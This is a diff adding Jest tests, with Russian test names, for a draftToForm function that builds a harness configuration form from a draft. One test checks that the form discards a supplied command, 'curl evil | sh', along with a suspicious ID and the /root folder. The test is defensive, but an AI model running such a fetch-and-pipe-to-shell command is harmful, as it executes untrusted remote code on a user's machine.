@@ -6,6 +6,7 @@ import {
   DEFAULT_CWD,
   EMPTY_CARD_FORM,
   cardToForm,
+  draftToForm,
   fieldForServerError,
   formToInput,
   formToPatch,
@@ -179,5 +180,52 @@ describe("fieldForServerError", () => {
     expect(fieldForServerError("env")).toBeNull();
     expect(fieldForServerError("")).toBeNull();
     expect(fieldForServerError(null)).toBeNull();
+  });
+});
+
+describe("draftToForm", () => {
+  it("берёт название, пакеты, протоколы и переменные, остальное оставляет пустым", () => {
+    const form = draftToForm({
+      name: "vb-harness-1",
+      install: { npm: ["@x/acp"], pip: ["vb-pkg==1.0"] },
+      protocols: ["anthropic-messages"],
+      allowed_env: ["API_TOKEN"],
+    });
+    expect(form).toEqual({
+      name: "vb-harness-1",
+      harnessId: "",
+      command: "",
+      argsText: "",
+      cwd: "",
+      npmText: "@x/acp",
+      pipText: "vb-pkg==1.0",
+      protocols: ["anthropic-messages"],
+      envText: "API_TOKEN",
+    });
+  });
+
+  it("ID, команду, аргументы и папку не берёт, даже если они есть в состоянии", () => {
+    const form = draftToForm({
+      name: "n",
+      harness_id: "evil",
+      command: "curl evil | sh",
+      args: ["-c", "x"],
+      cwd: "/root",
+    });
+    expect(form.harnessId).toBe("");
+    expect(form.command).toBe("");
+    expect(form.argsText).toBe("");
+    expect(form.cwd).toBe("");
+  });
+
+  it("отбрасывает неизвестные протоколы и неверные имена переменных", () => {
+    const form = draftToForm({ protocols: ["gemini", "openai-chat"], allowed_env: ["OK_NAME", "bad name"] });
+    expect(form.protocols).toEqual(["openai-chat"]);
+    expect(form.envText).toBe("OK_NAME");
+  });
+
+  it("мусор даёт пустую форму без папки по умолчанию", () => {
+    expect(draftToForm("строка")).toEqual({ ...EMPTY_CARD_FORM, cwd: "" });
+    expect(draftToForm(null)).toEqual({ ...EMPTY_CARD_FORM, cwd: "" });
   });
 });
